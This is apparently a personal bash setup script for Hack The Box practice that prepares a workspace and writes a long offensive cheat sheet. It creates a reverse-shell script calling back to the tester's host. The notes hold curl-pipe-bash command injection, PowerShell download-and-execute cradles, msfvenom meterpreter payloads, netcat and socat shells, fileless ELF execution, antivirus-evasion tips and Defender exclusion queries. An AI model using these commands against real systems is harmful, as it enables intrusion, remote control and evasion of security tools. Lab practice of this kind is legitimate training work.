#!/bin/bash
# to run type '. /directory/setup'
# set box name, IP and ostype
#for folder in $(ls /opt/); do cd /opt/$folder/; sudo git pull; done

BOXNAME=Mist
LAST=
OS=lin
USER=bob

export IP=10.10.11.17			#$LAST
export HOME=/home/$USER/hackthebox/$BOXNAME          #enter box Name
export SELF=$(hostname -I | awk '{print $5}')
export HTB_TOKEN=$(cat /opt/Scripts/.HTB_TOKEN)
export BOXNAME=$BOXNAME

#start obsidian in background and push errors/output to /dev/null will need to copy .config/obsidian to folder or something to make it load the working directory but will figure out later...
#and uhh.. doesn't load the newest version.. for some reason will add to notes to get it going may be just copying the vaults to show the vaults the .config/obsidian/obsidian.json but will play with later.. 
# the current working vault =
#/opt/obsidian/Obsidian-0.11.5.AppImage &>/dev/null &

#read "Press [Enter] key if this is first run"
#read "Are you sure this is the first run?"
## Bash add pause prompt for 5 seconds ##
#read -t 5 "I am going to wait for 5 seconds only ..."

#only run if first time or will lose all work
mkdir $HOME
mkdir $HOME/nmap
mkdir $HOME/buster
mkdir $HOME/www
mkdir $HOME/$BOXNAME
touch $HOME/notes
touch $HOME/.hushlogin

# copy windows specif scripts to windows box or linux specific to linux box
cp /opt/Scripts/auto_stabilize_shell.sh $HOME/
cp /opt/Scripts/.bashrc $HOME/
cp /opt/Scripts/.bash_aliases $HOME/
cp /opt/Scripts/.tmux.conf $HOME/
cp /opt/Scripts/.zshrc $HOME/

if [[ "$OS" == "win" ]]; then

    #curl -s -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany.exe -o $HOME/www/winPEASany.exe
    #curl -s -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.bat -o $HOME/www/winPEAS.bat
    curl -s -L https://github.com/carlospolop/PEASS-ng/releases/download/20220930/winPEASx64.exe -o $HOME/www/winpeasx64.exe
    curl -s -L https://github.com/carlospolop/PEASS-ng/releases/download/20220930/winPEASany.exe -o $HOME/www/winpeasany.exe
    #cp /opt/PEASS-ng/winPEAS/winPEASexe/binaries/Release/winPEASany.exe $HOME/www
    #cp /opt/PEASS-ng/winPEAS/winPEASbat/winPEAS.bat $HOME/www
    #cp /usr/share/windows-resources/binaries/netcat32/netcat-1.11/nc64.exe $HOME/www
    cp /usr/share/windows-resources/binaries/nc.exe $HOME/www
    cp /opt/ConPtyShell/shell.ps1  $HOME/www
    cp /opt/ConPtyShell/ConPtyShell.exe $HOME/www
    cp /opt/ConPtyShell/ConPtyShell.cs $HOME/www
    cp /opt/RunasCs/RunasCs.exe $HOME/www
    cp /opt/SharpExclusionFinder.exe $HOME/www
else
    curl -s -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o $HOME/www/linpeas.sh
    curl -s -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas_linux_amd64 -o $HOME/www/linpeas_linux_amd64
    #cp /opt/PEASS-ng/linPEAS/linpeas.sh $HOME/www/
    curl -s -L https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64s -o $HOME/www/pspy64s
    curl -s -L https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64 -o $HOME/www/pspy64
fi
echo -ne '#!/bin/bash\nbash -i >& /dev/tcp/'$SELF'/9001 0>&1' >> $HOME/www/shell.sh
chmod +x $HOME/www/*


# Build notes
echo '# Standard enumration' >> $HOME/notes
echo '#export IP='$IP > $HOME/notes
echo '#masscan -p1-65535,U:1-65535 $IP --rate=1000 -e tun0' >> $HOME/notes
echo '#nmap -sC -sV -p- -vvv -oN $HOME/nmap/Initial $IP' >> $HOME/notes
echo '#gobuster dir -u $IP -w /usr/share/wordlists/dirb/common.txt -s 200 -x php,html,txt,xml,sh,py -o buster/80dir.log' >> $HOME/notes
echo '#gobuster dir -u http://$IP/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -o buster/root.log' >> $HOME/notes
echo '#gobuster dir -u http://$IP/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-files.txt -o buster/root_files.log' >> $HOME/notes
echo '#gobuster vhosts -u http://$BOXNAME.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -o buster/vhosts.log' >> $HOME/notes
echo '#gobuster dns domain.com -o buster/dom.log' >> $HOME/notes
echo "don\'t do this: curl http://$IP/cmd.php?cmd=curl http://$SELF/shell.sh|bash ... (unless in browser window) do: " >> $HOME/notes
echo "curl http://$IP/cmd.php --data-urlencode \'cmd=curl http://$SELF/shell.sh|bash\'" >> $HOME/notes
echo "svn export https://github.com/repo.git/trunk/<folder to download>"  >> $HOME/notes
echo "echo -n '+'|jq -Rr @uri" >> $HOME/notes

# tmux
echo "" >> $HOME/notes
echo "# tmux" $HOME/notes
echo "if wanting to use another environmemnt in tmux and have multiple servers running" >> $HOME/notes
echo "first start a new socket then call the socket with -S and attache to the socket" >> $HOME/notes
echo "tmux -L Boxname" >> $HOME/notes
echo "tmux -S /tmp/tmux-1000/Boxname ls" >> $HOME/notes
echo "tmux -S /tmp/tmux-1000/Boxname a -t 0" >> $HOME/notes
echo "tmux show-environment [-g] [-t target-session] || tmux set-environment [-gru] [-t target-session] name [value]" >> $HOME/notes
echo "tmux show-environment -t 0 || tmux set-environment -t 0 IP 127.0.0.1 || and have to start new windows" >> $HOME/notes

# Try nikto
echo "" >> $HOME/notes
echo "# nikto" >> $HOME/notes
echo "nikto -h $IP" >> $HOME/notes
echo "add machine name domain.htb to /etc/hosts (search to ensure named correct)" >> $HOME/notes
echo "nikto -h domain.htb" >> $HOME/notes

# To fix copy and paste problems in Virtual box
echo "" >> $HOME/notes
echo "# when in virtual Machine" >> $HOME/notes
echo "any problems kill VBoxClient clipboard etc." >> $HOME/notes

# Windows shells
echo "" >> $HOME/notes
echo '# Windows Shells' >> $HOME/notes
echo 'echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.10.10:8080/shell.ps1')" | iconv --to-code UTF16LE | base64 -w0' >> $HOME/notes
echo "powershell.exe -nop -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadFile('http://10.10.14.155/winPEAS.bat', 'C:\temp\winPEAS.bat')\"" >> $HOME/notes
echo 'IWR http://10.10.10.10/shell.exe -OutFile shell.exe' >> $HOME/notes
echo 'cp /usr/share/webshells/php/simple-backdoor.php .' >> $HOME/notes
echo 'klist,kinit,ksu when you have a tgt or tgs and just kerberos port 88' >> $HOME/notes

# usefull windows stuff.
echo "" >> $HOME/notes
echo "# usefull windows tricks" >> $HOME/notes
echo 'msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.124 LPORT=9001 -f exe -o shell.exe' >> $HOME/notes
echo 'Get-CimInstance -Query "select * from win32_service where Started=True"|fl Name,PathName,Started,StartName' >> $HOME/notes
echo 'Expand-Archive xyz.zip' >> $HOME/notes
echo 'iconv -f utf-16le -t utf-8 lin.log -o lin2.log' >> $HOME/notes
echo 'Start-Job -FilePath C:\Scripts\Sample.ps1' >> $HOME/notes
echo "Invoke-Command -Computer dc01 -ScriptBlock { C:\blah.exe } -asJob" >> $HOME/notes
echo "Invoke-Command -scriptblock { script }  -asJob -computername localhost" >> $HOME/notes
echo "Start-Job -scriptblock { script }" >> $HOME/notes
echo "Start-Process powershell {script}" >> $HOME/notes
echo "Get-Process <name>" >> $HOME/notes
echo "Stop-Process <pid>" >> $HOME/notes

# Windows privesc checklist
echo "" >> $HOME/notes
echo '# Windows privesc checklist' >> $HOME/notes
echo 'https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation' >> $HOME/notes

# linux privesc checklist
echo "" >> $HOME/notes
echo '# linux privesc checklist' >> $HOME/notes
echo 'https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist' >> $HOME/notes

# CREATE A CREDENTIAL OBJECT
echo "" >> $HOME/notes
echo '# CREATE A CREDENTIAL OBJECT' >> $HOME/notes
echo "\$pass = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force" >> $HOME/notes
echo "\$cred = New-Object System.Management.Automation.PSCredential(\"<USERNAME>\", \$pass)" >> $HOME/notes
# For local
echo "" >> $HOME/notes
echo '# For Local' >> $HOME/notes
echo "Start-Process -Credential (\$cred)  -NoNewWindow powershell \"iex (New-Object Net.WebClient).DownloadString('http://10.10.14.11:443/ipst.ps1')\"" >> $HOME/notes
echo 'see basic powershell in hacktricks for more' >> $HOME/notes
# runascs
echo "" >> $HOME/notes
echo '# runascs' >> $HOME/notes
echo 'runascs.ps1 is great for executing as another user if all else fails..' >> $HOME/notes
echo 'Invoke-RunasCs -Username user1 -Password password1 -Command powershell.exe (or cmd.exe) -Remote 10.10.14.129:9001' >> $HOME/notes

# Cool way to pivot/scan
echo "" >> $HOME/notes
echo "# really cool way to pivot/scan with nc" >> $HOME/notes
echo "mkfifo reply" >> $HOME/notes
echo "nc -klvnp 65535 < reply | nc 127.0.0.1 6739 > reply" >> $HOME/notes
echo "(nc -klvnp <port to use> < reply | nc 127.0.0.1 <port interested in scanning etc> > reply)" >> $HOME/notes
echo "(dont forget to rm reply)" >> $HOME/notes
echo "Then can just scan port 6379 through 65535 etc." >> $HOME/notes
echo "to scan ports with busybox/nc nc -z -v -w 1 192.168.0.1 80" >> $HOME/notes

# More ways to pivot
echo "" >> $HOME/notes
echo "# More ways to pivot" >> $HOME/notes
echo "9510 and other ports through chisel" >> $HOME/notes
echo "# On Kali" >> $HOME/notes
echo "kali@kali:~$ ./chisel server -p 9002 --reverse  " >> $HOME/notes
echo "# On Windows" >> $HOME/notes
echo "./chisel client 10.10.14.128:9002 R:8080:localhost:8080 R:9510:localhost:9510 R:9512:localhost:9512" >> $HOME/notes
echo "# if using metasploit" >> $HOME/notes
echo "portfwd add -l 9510 -p 9510 -r 10.10.11.115" >> $HOME/notes

# Relay Binaries
echo "" >> $HOME/notes
echo "# Relay Binaries" >> $HOME/notes
echo "socat TCP4-LISTEN:4444,fork EXEC:/bin/bash" >> $HOME/notes
echo "socat tcp-listen:7777,reuseaddr,fork exec:cat,nofork" >> $HOME/notes
echo "socat tcp-l:9999,reuseaddr,fork EXEC:./leak" >> $HOME/notes
echo "socat -U TCP-LISTEN:5403,fork EXEC:'/usr/bin/data',stderr,pty,echo=0" >> $HOME/notes
echo "socat tcp-l:5000,reuseaddr,fork EXEC:\"./vuln\",pty,stderr" >> $HOME/notes
echo "ncat -l 1234 -c '/usr/bin/data' --keep-open" >> $HOME/notes
echo "nc -lvnp 9999 -e '/usr/local/bin'" >> $HOME/notes
echo "## create named pipe" >> $HOME/notes
echo "rm -f /tmp/f; mkfifo /tmp/f" >> $HOME/notes
echo "## launch interactive 'sh' session redirected to/from listening nc" >> $HOME/notes
echo "cat /tmp/f | /bin/sh -i 2>&1 | nc -l 1234 > /tmp/f" >> $HOME/notes
echo "from another terminal connect" >> $HOME/notes

# Static Binaries
echo "" >> $HOME/notes
echo "# Static Binaries" >> $HOME/notes
echo "https://github.com/andrew-d/static-binaries" >> $HOME/notes
echo "https://github.com/polaco1782/linux-static-binaries" >> $HOME/notes

# Windows Sharp Binaries
echo "" >> $HOME/notes
echo "# Windows Sharp Binaries" >> $HOME/notes
echo "check this out - git clone https://github.com/Flangvik/SharpCollection.git for windows sharp binaries" >> $HOME/notes

# Run Obsidian in background
echo "" >> $HOME/notes
echo "# Run Obsidian" >> $HOME/notes
echo "/opt/obsidian/Obsidian-0.15.9.AppImage &>/dev/null &" >> $HOME/notes

# AntiVirus Evasion
echo "" >> $HOME/notes
echo "# Anti Virus Evasion" >> $HOME/notes
echo "## Nishang" >> $HOME/notes
echo "for nishang antivirus evasion, just replace the Invoke-PowershellTcp with anything" >> $HOME/notes
echo "and replace sendback with anything, and it should replace sendback and sendback2" >> $HOME/notes
echo "and for the oneliner, split it to individual lines after every semicolon (;) , or just at after the {0};" >> $HOME/notes 
echo "## Conptyshell" >> $HOME/notes
echo "for conpty shell replace the name invoke-conptyshell and conptyshell and remove the how to use section" >>$HOME/notes
echo "[defender exclusions](https://blog.fndsec.net/2024/10/04/uncovering-exclusion-paths-in-microsoft-defender-a-security-research-insight/)" >> $HOME/notes
echo "Get-MPPreference | select-object ExclusionPath" >> $HOME/notes
echo "Get-WinEvent -LogName \"Microsoft-Windows-Windows Defender/Operational\" -FilterXPath \"*[System[(EventID=5007)]]\" | Where-Object { $_.Message -like \"*exclusion\Path*\" } | Select-Object Message | FL" >> $HOME/notes
echo "& \"C:\Program Files\Windows Defender\MpCmdRun.exe\" -Scan -ScanType 3 -File \"C:\folder_to_check\|*\"" >> $HOME/notes

# Fileless elf execution
echo "" >> $HOME/notes
echo "# Fileless elf execution" >> $HOME/notes
echo "curl http://10.10.14.178/ls.b64 |bash <(curl http://10.10.14.178/ddexec.sh) /bin/test -al" >> $HOME/notes
# Docker commands
echo "" >> $HOME/notes
echo "# Docker commands" >> $HOME/notes
echo "# enter docker image" >> $HOME/notes
echo "sudo docker run -it --rm --entrypoint bash hacktehbox/node-web-app" >> $HOME/notes
echo "# enter docker container" >> $HOME/notes
echo "sudo docker exec -it container bash" >> $HOME/notes
# OverlayFS and GameOverlay
echo "" >> $HOME/notes
echo "# OverlayFS and GameOverlay" >> $HOME/notes
echo "https://www.reddit.com/r/selfhosted/comments/15ecpck/ubuntu_local_privilege_escalation_cve20232640/" >> $HOME/notes
echo "https://github.com/briskets/CVE-2021-3493" >> $HOME/notes
# LFI and Directory Traversal
echo "" >> $HOME/notes
echo "# LFI and Directory Traversal" >> $HOME/notes
echo "# ../../etc/passwd (dots and filenames)" >> $HOME/notes
echo "directory traversal/intruder" >> $HOME/notes
echo "  directory_traversal.txt:140" >> $HOME/notes
echo "  dotdotpwn.txt:21144" >> $HOME/notes
echo "File Inclusion/Intruders" >> $HOME/notes
echo "  Traversal.txt:4521" >> $HOME/notes
echo "# ../../{FILES} (:%s/{FILES}//g --> page=FUZZ1FUZZ2 -w deep_traversal.txt:FUZZ1 -w list2:FUZZ2)" >> $HOME/notes
echo "directory traversal/intruder" >> $HOME/notes
echo "  deep_traversal.txt:878" >> $HOME/notes
echo "  traversals-8-deep-exotic-encodings.txt:887" >> $HOME/notes
echo "# /etc/passwd (just files to search for not dots)" >> $HOME/notes
echo "file inclusion/intruders" >> $HOME/notes
echo "  BSD-files.txt:12" >> $HOME/notes
echo "  LFI-FD-check.txt:38" >> $HOME/notes
echo "  LFI-WindowsFileCheck.txt:69" >> $HOME/notes
echo "  Linux-files.txt:61" >> $HOME/notes
echo "  List_Of_File_To_Include_NullByteAdded.txt:318" >> $HOME/notes
echo "  List_Of_File_To_Include.txt:911" >> $HOME/notes
echo "  Mac-files.txt:7" >> $HOME/notes
echo "  simple-check.txt:9" >> $HOME/notes
echo "  Web-files.txt:13" >> $HOME/notes
echo "  Windows-files.txt:212" >> $HOME/notes
echo "# ../../ (just dots)" >> $HOME/notes
echo "file inclusion/intruders" >> $HOME/notes
echo "  dot-slash-PathTraversal_and_LFI_pairing.txt:885" >> $HOME/notes
echo "# ../../ or ../../etc/passwd (both dots and just files and dots with files)" >> $HOME/notes
echo "file inclusion/intruders" >> $HOME/notes
echo "  JHADDIX_LFI.txt:879" >> $HOME/notes

# Build obsidian files for note keeping
# Cover page
echo '<p align="center">' >> $HOME/$BOXNAME/000\ -\ Cover.md
echo '  <img  width=1024 src="" />' >> $HOME/$BOXNAME/000\ -\ Cover.md
echo '</p>' >> $HOME/$BOXNAME/000\ -\ Cover.md
echo ' ' >> $HOME/$BOXNAME/000\ -\ Cover.md
echo '# Path of Exploitation' >> $HOME/$BOXNAME/000\ -\ Cover.md
echo '* Foothold:' >> $HOME/$BOXNAME/000\ -\ Cover.md
echo '* User:'  >> $HOME/$BOXNAME/000\ -\ Cover.md
echo '* root:' >> $HOME/$BOXNAME/000\ -\ Cover.md
echo ' ' >> $HOME/$BOXNAME/000\ -\ Cover.md
# loot page
echo '# Creds' >> $HOME/$BOXNAME/00\ -\ Loot.md
echo '| Username | Password | Description |' >> $HOME/$BOXNAME/00\ -\ Loot.md
echo '| --- | --- | -- |' >> $HOME/$BOXNAME/00\ -\ Loot.md
echo '| | | |' >> $HOME/$BOXNAME/00\ -\ Loot.md
# Nmap page
echo '# Nmap' >> $HOME/$BOXNAME/05\ -\ Nmap.md
echo '| Port | Service | Description |' >> $HOME/$BOXNAME/05\ -\ Nmap.md
echo '| --- | --- | --- |' >> $HOME/$BOXNAME/05\ -\ Nmap.md
echo '| 22 | ssh | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) |' >> $HOME/$BOXNAME/05\ -\ Nmap.md
echo '| 80 | http | |' >> $HOME/$BOXNAME/05\ -\ Nmap.md
echo '| | | |' >> $HOME/$BOXNAME/05\ -\ Nmap.md
echo ' '
echo 'Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel' >> $HOME/$BOXNAME/05\ -\ Nmap.md
# Web enumeration page
echo '# Web Enumeration' >> $HOME/$BOXNAME/10\ -\ Web\ Enumeration.md

# View notes
#cat $HOME/notes
# script to setup my tmux environment
cd
tmux new-session -d
# stay in first windows
tmux split-window -v -d
tmux send-keys 'nmapfull' Enter
# split h and stay in first window
tmux split-window -h -d
#send keys to the new split window
tmux send-keys -t %2 'cd www/;clear' Enter
tmux send-keys -t %2 'python3 -m http.server 80' Enter
tmux split-window -h -t %1 -d
tmux send-keys -t %1 'nmapudp' Enter
tmux new-window -d
tmux send-keys -t @1 'cd $BOXNAME;nano "10 - Web Enumeration.md"' Enter
tmux new-window -d
tmux send-keys -t @2 'feroxbuster -u http://$IP -w  /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt --thorough'
tmux new-window -d
tmux send-keys -t @3 'ffuf -u http://$IP -H "Host: FUZZ.$BOXNAME.htb" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -mc all'
#tmux send-keys 'C-b'
#tmux list-panes
#tmux list-windows
tmux a -t 0
